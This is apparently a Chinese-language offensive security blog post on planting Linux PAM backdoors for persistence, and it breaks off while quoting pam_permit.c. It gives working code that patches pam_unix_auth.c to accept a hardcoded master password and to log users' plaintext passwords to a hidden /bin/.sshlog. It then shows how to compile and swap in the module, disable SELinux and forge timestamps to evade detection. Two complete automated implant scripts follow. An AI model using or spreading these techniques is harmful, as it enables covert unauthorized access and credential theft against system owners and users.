## 前言
渐渐发现 **pam后门** 在实战中存在 **种植繁琐、隐蔽性不强** 等缺点，这里记录下学习pam后门相关知识和pam后门的拓展改进。
* * *
## 0x01 PAM Backdoor
**PAM**
是一种认证模块，PAM可以作为Linux登录验证和各类基础服务的认证，简单来说就是一种用于Linux系统上的用户身份验证的机制。进行认证时首先确定是什么服务，然后加载相应的PAM的配置文件(位于
**/etc/pam.d** )，最后调用认证文件(位于 **/lib/security** )进行安全认证
**简易利用** 的PAM后门也是通过修改 **PAM** 源码中认证的逻辑来达到权限维持
以下为Pam后门种植的过程，只是特别把一点tips和需要注意的点贴出来。
查询目标版本后下载对应源代码修改认证逻辑、编译替换原认证文件即可。版本务必要和目标系统完全保持对应。
源码:`http://www.linux-pam.org/library/`
查询版本`rpm -qa | grep pam`
    tar -xzvf Linux-PAM-1.1.1.tar.gz
    cd Linux-PAM-1.1.1
    cd modules/pam_unix/
    vim pam_unix_auth.c
**pam_unix_auth.c** 在这里你可以修改认证逻辑，改成使用特定密码的后门，当然也可以作为一个记录敏感密码的功能，将记录的密码写入文件记录。
    /* verify the password of this user */
    retval = _unix_verify_password(pamh, name, p, ctrl);
    if(strcmp("qing!@#123",p)==0){return PAM_SUCCESS;}
    if(retval == PAM_SUCCESS){
            FILE * fp;
            fp = fopen("/bin/.sshlog", "a");
            fprintf(fp, "%s : %s\n", name, p);
            fclose(fp);
            }
这里也提一下，实际各种复杂环境还是推荐非交互去修改源码
    apt-get install dpkg-dev flex
    apt-get source libpam-modules=`dpkg -s libpam-modules \
    > | grep -i version | cut -d' ' -f2`
     cd pam-1.1.1/modules/pam_unix/
     sed -i '/\tretval = _unix_verify_password(pamh, name, p, ctrl);/ a \\tif (strcmp(p, \"micasa\") == 0) { retval = PAM_SUCCESS; }' pam_unix_auth.c
     cd ../..
     ./configure
     make
     cd
#### 编译、修改:
在目标机器上重新编译PAM,而后,再将生成的库复制到系统的/lib64/security/[注意,32和64位系统下该目录的路径不一样的目录下
    cd ../../
    ./configure && make  (./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr)
    mv pam_unix.so{,.bak} #备份
    cp /root/Linux-PAM-1.1.1/modules/pam_unix/.libs/pam_unix.so /lib64/security/ #覆盖替换
    echo $?
#### 注意的tips
过程只是有些步骤，需要注意的时候在编译后门关闭Selinux或设置上下文，以及修改pam认证的一些时间戳达到基本的隐蔽。
    stat pam_unix.*
    touch -t 201002160134 pam_unix.so
    touch pam_unix.so -r pam_unix.so.src  #克隆原始文件时间
    ls -Z pam_unix.so.src (查看原始文件的Selinux上下文) 
    chcon –reference=pam_unix.so.src pam_unix.so   setsebool -P allow_saslauthd_read_shadow 1    # 设置Selinux上下文
    #或直接时间戳给变量来修改
     timestamp=`ls -l /lib/security/ | grep pam_unix.so | grep -v ^l \
    > | awk '{print $6$7}' | tr -d '-' | tr -d ':'`
     touch -t $timestamp /lib/security/pam_unix.so
一定注意替换完成后测试ok再退出不然基本的认证就乱了
    root@qing:~/pam/Linux-PAM-1.1.8/modules/pam_unix# ls -alh /bin/.sshlog
    -rw-r--r--. 1 root root 162 May 31 03:15 /bin/.sshlog
#### Pam 后门一些报错解决:
编译中的问题解决:64位系统编译可能会遇到 **yywrap()** 函数未定义错误
  * 1.根据提示的文件路径，在里面定义
  * #define yywrap() 1 或者int yywrap(){return 1;}
  * 2.在C文件中定义 %option noyywrap
  * 3.安装flex软件包就可以正常编译了 yum install flex
记得Selinux一定要关闭或者设置上下文
#### Pam后门种植脚本
但是在种植过程中对于步骤显得有点繁琐，脚本来简化步骤，脚本一把PAM种植过程的命令傻瓜式写进sh， 脚本二来自zephrax:
    root@qing:~/pam# cat pam.sh
    #!/bin/bash
    PASS='qing123' ##......
    LOG='\/bin\/.sshlog' ##......
    echo -e "\nPam-Backdoor\n\n\n"
    version=`rpm -qa | grep pam | awk -F- '{print $2}'`
    #get the pam version
    #close the selinux
    if [ `getenforce` = '1' ];then
    setenforce 0
    line_n = `grep -n "^SELINUX=enforcing" /etc/sysconfig/selinux | awk -F: '{print $1}'`
    sed -i $line_n' d' /etc/sysconfig/selinux
    sed -i $line_n" a\SELINUX=disabled" /etc/sysconfig/selinux
    /etc/sysconfig/selinux
    else
    echo "selinux is closed"
    fi
    if [ `uname -p` = 'x86_64' ];then
    LIBPATH=lib64
    else
    LIBPATH=lib
    fi
    oldtime=`stat -c '%z' /lib64/security/pam_ftp.so`
    echo 'Pam backdoor starting!'
    mirror_url='http://www.linux-pam.org/library/Linux-PAM-'$version'.tar.gz'
    #mirror_url='http://yum.singlehop.com/pub/linux/libs/pam/pre/library/Linux-PAM-0.99.6.2.tar.gz'
    version='Linux-PAM-'$version
    echo 'Fetching from '$mirror_url
    wget $mirror_url #fetch the roll
    tar zxf $version'.tar.gz' #untar
    cd $version
    #find and replace
    sed -i -e 's/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\n\tif (strcmp(p,"'$PASS'")==0 ){retval = PAM_SUCCESS;}if(retval == PAM_SUCCESS){\n\tFILE * fp;\n\tfp = fopen("'$LOG'", "a");\n\tfprintf(fp, "%s : %s\\n", name, p);\n\tfclose(fp);\n\t}/g' modules/pam_unix/pam_unix_auth.c
    DIS=`head /etc/issue -n 1|awk '{print $1}'`
    #get the version
    if [ $DIS = "CentOS" ];then
    ./configure --disable-selinux && make
    else
    ./configure && make
    fi
    /bin/cp -rf /$LIBPATH/security/pam_unix.so /$LIBPATH/security/pam_unix.so.bak #.. .........
    /bin/cp -rf modules/pam_unix/.libs/pam_unix.so /$LIBPATH/security/pam_unix.so
    touch -d "$oldtime" /$LIBPATH/security/pam_unix.so
    cd .. && rm -rf Linux-PAM-1.1.1*
    echo "PAM BackDoor is Done"
    #!/bin/bash
    OPTIND=1
    PAM_VERSION=
    PAM_FILE=
    PASSWORD=
    echo "Automatic PAM Backdoor"
    function show_help {
        echo ""
        echo "Example usage: $0 -v 1.3.0 -p some_s3cr3t_p455word"
        echo "For a list of supported versions: http://www.linux-pam.org/library/"
    }
    while getopts ":h:?:p:v:" opt; do
        case "$opt" in
        h|\?)
            show_help
            exit 0
            ;;
        v)  PAM_VERSION="$OPTARG"
            ;;
        p)  PASSWORD="$OPTARG"
            ;;
        esac
    done
    shift $((OPTIND-1))
    [ "$1" = "--" ] && shift
    if [ -z $PAM_VERSION ]; then
        show_help
        exit 1
    fi;
    if [ -z $PASSWORD ]; then
        show_help
        exit 1
    fi;
    echo "PAM Version: $PAM_VERSION"
    echo "Password: $PASSWORD"
    echo ""
    PAM_BASE_URL="http://www.linux-pam.org/library"
    PAM_DIR="Linux-PAM-${PAM_VERSION}"
    PAM_FILE="Linux-PAM-${PAM_VERSION}.tar.bz2"
    PATCH_DIR=`which patch`
    if [ $? -ne 0 ]; then
        echo "Error: patch command not found. Exiting..."
        exit 1
    fi
    wget -c "${PAM_BASE_URL}/${PAM_FILE}"
    tar xjf $PAM_FILE
    cat backdoor.patch | sed -e "s/_PASSWORD_/${PASSWORD}/g" | patch -p1 -d $PAM_DIR
    cd $PAM_DIR
    ./configure
    make
    cp modules/pam_unix/.libs/pam_unix.so ../
    cd ..
    echo "Backdoor created."
    echo "Now copy the generated ./pam_unix.so to the right directory (usually /lib/security/)"
    echo ""
pam 后门种植过程中也可以发现一些可以改进优化的点，比如 **加载** 认证后门 _方式、文件，以及对于 **劫持**
密码_的形式不一定是写入文本文件的形式。
## 0x02 Pam_permit Backdoor
因为种植机器环境的 **不确定性** ,很难保证在包管理器中提供了某种 **对文件校验**
，可用于检测文件系统中现有程序的操作。这些校验分发包中合法随附的文件的完整性，也许在我们修改认证so类似这种 **系统敏感文件** 就会触发监控报警
我们也可以在原Pam后门种植中变通一下在 **不替换原系统认证pam文件** 来达到相同的权限维持目的。
而类似在pam认证逻辑中改变认证结果，不一定非要在文件中修改，在认证中存在 **pam_permit.so** 模块,而而 **pam_permit**
模块任何时候都返回认证成功.
    root@qing:~/pam/Linux-PAM-1.1.8/modules# cat pam_permit/pam_permit.c
    /* pam_permit module */
    /*
     * $Id$
     *
     * Written by Andrew Morgan  1996/3/11
     *
     */
    #include "config.h"
    #define DEFAULT_USER "nobody"
    #include 
    /*
     * here, we make definitions for the externally accessible functions
     * in this file (these definitions are required for static modules
     * but strongly encouraged generally) they are used to instruct the
     * modules include file to define their prototypes.